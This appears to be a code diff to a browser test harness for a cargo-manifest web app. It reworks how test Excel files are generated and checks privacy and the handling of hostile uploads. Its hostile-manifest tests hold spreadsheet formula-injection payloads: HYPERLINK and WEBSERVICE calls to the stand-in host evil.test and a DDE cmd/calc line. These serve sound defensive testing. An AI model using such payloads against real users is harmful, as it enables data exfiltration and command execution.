@@ -6,6 +6,7 @@ import { spawn } from "node:child_process";
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
+import vm from "node:vm";
 import { loadGs } from "./gs-harness.mjs";
 
 const APP = 5300, SHEET = 5301, CDP = 9340;
@@ -322,8 +323,20 @@ const relevant = pageErrors.filter((e) => !expected(e));
 check(!relevant.some((e) => /Content Security Policy|Refused to/.test(e)), "no Content-Security-Policy violations" + (relevant.length ? "" : ""));
 check(relevant.length === 0, `no uncaught page errors${relevant.length ? ": " + relevant.slice(0, 5).join(" || ") : ""}`);
 
-// the builder page no longer loads SheetJS itself (only its worker does); tests load the self-hosted copy to make test files
-const LOAD_XLSX = `new Promise(r=>{if(window.XLSX)return r(1);const s=document.createElement('script');s.src='/vendor/sheetjs/0.20.3/xlsx.full.min.js';s.onload=()=>r(1);document.head.appendChild(s)})`;
+// The builder page does not load SheetJS (only its worker does). Test .xlsx files are made here in Node with the same
+// self-hosted copy, never by injecting SheetJS into the page: that would define window.XLSX and hide page bugs.
+const SHEETJS = (() => {
+  const ctx = vm.createContext({ console });
+  vm.runInContext(fs.readFileSync(new URL("../public/vendor/sheetjs/0.20.3/xlsx.full.min.js", import.meta.url), "utf8"), ctx);
+  return ctx.XLSX;
+})();
+const xlsxB64 = (aoa, patch) => {
+  const ws = SHEETJS.utils.aoa_to_sheet(aoa);
+  if (patch) patch(ws);
+  const wb = SHEETJS.utils.book_new();
+  SHEETJS.utils.book_append_sheet(wb, ws, "S");
+  return SHEETJS.write(wb, { type: "base64", bookType: "xlsx" });
+};
 console.log("\nPrivacy: cargo never leaves the browser (synthetic markers, every request watched)");
 {
   // distinctive synthetic values that must never appear in any request or in anything forwarded to the sheet
@@ -337,10 +350,9 @@ console.log("\nPrivacy: cargo never leaves the browser (synthetic markers, every
     const dt=new DataTransfer();dt.items.add(new File([data],${JSON.stringify(name)}));const f=document.getElementById('file');f.files=dt.files;f.dispatchEvent(new Event('change'));
     await new Promise(r=>{const t0=Date.now(),iv=setInterval(()=>{if(document.getElementById('st1s').textContent!==b0||Date.now()-t0>4000){clearInterval(iv);r()}},40)});await new Promise(r=>setTimeout(r,1300));return document.getElementById('toast').textContent})()`);
   await up("secret.csv", csv);
-  // the same kind of data as a real .xlsx made in the page with SheetJS
-  await js(LOAD_XLSX);
-  await js(`(async()=>{const ws=XLSX.utils.aoa_to_sheet([["AWB","Goods","Pieces","Weight","L","W","H"],[${JSON.stringify(MK.awb2)},${JSON.stringify(MK.nat2)},2,${MK.kg},137,41,59]]),wb=XLSX.utils.book_new();XLSX.utils.book_append_sheet(wb,ws,'B');
-    const buf=XLSX.write(wb,{type:'array',bookType:'xlsx'});const dt=new DataTransfer();dt.items.add(new File([buf],'secret.xlsx'));const f=document.getElementById('file');f.files=dt.files;f.dispatchEvent(new Event('change'));await new Promise(r=>setTimeout(r,2500))})()`);
+  // the same kind of data as a real .xlsx, read by the page exactly as a visitor's file would be
+  check((await js(`typeof window.XLSX`)) === "undefined", "the builder page itself does not load SheetJS (Excel is read only in the worker)");
+  await up("secret.xlsx", xlsxB64([["AWB", "Goods", "Pieces", "Weight", "L", "W", "H"], [MK.awb2, MK.nat2, 2, +MK.kg, 137, 41, 59]]), true);
   await js(`(async()=>{const s=(id,v)=>{const e=document.getElementById(id);e.value=v;e.dispatchEvent(new Event('input'));e.dispatchEvent(new Event('change'))};if(document.getElementById('addPanel').hidden)document.getElementById('addToggle').click();
     s('sAwb','999-77700033');s('sNat',${JSON.stringify(MK.nat3)});s('sPcs','2');s('sWt','${MK.kg}');s('sL','137');s('sW','41');s('sH','59');document.getElementById('fSubmit').click();await new Promise(r=>setTimeout(r,1500))})()`);
   const n = await js(`JSON.parse(localStorage.getItem('adeyiq-ships')||'[]').length`);
@@ -385,8 +397,9 @@ console.log("\nHostile manifests (synthetic)");
   const net0 = netLog.length;
   const f1 = await up("formula.csv", `AWB,Goods,Pieces,Weight,L,W,H\n071-11112222,"=HYPERLINK(""http://evil.test/x"",""click"")",1,10,50,40,30\n071-11113333,"=WEBSERVICE(""http://evil.test/y"")",1,10,50,40,30\n071-11114444,@SUM(1+1)*cmd|' /C calc'!A0,1,10,50,40,30\n`);
   check(f1.n === 3 && (await js(`document.getElementById('cargo').textContent.includes('=HYPERLINK(')`)) && !netLog.slice(net0).some((r) => r.url.includes("evil.test")), "spreadsheet formulas in cells stay plain text and never trigger a request");
-  await js(LOAD_XLSX);
-  const xf = await js(`(async()=>{const ws=XLSX.utils.aoa_to_sheet([["AWB","Goods","Pieces","Weight","L","W","H"],["071-22223333","x",1,10,50,40,30]]);ws.B2={t:'s',v:'cached',f:'HYPERLINK("http://evil.test/z","x")'};const wb=XLSX.utils.book_new();XLSX.utils.book_append_sheet(wb,ws,'S');return btoa(String.fromCharCode(...new Uint8Array(XLSX.write(wb,{type:'array',bookType:'xlsx'}))))})()`);
+  const xf = xlsxB64([["AWB", "Goods", "Pieces", "Weight", "L", "W", "H"], ["071-22223333", "x", 1, 10, 50, 40, 30]], (ws) => {
+    ws.B2 = { t: "s", v: "cached", f: 'HYPERLINK("http://evil.test/z","x")' };
+  });
   await up("formula.xlsx", xf, true);
   check(!netLog.slice(net0).some((r) => r.url.includes("evil.test")), "an Excel formula cell is read as its stored value and never fetches anything");
   const f2 = await up("broken.xlsx", Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0, 0, 0, 8, 0]), Buffer.alloc(300, 0x41)]).toString("base64"), true);
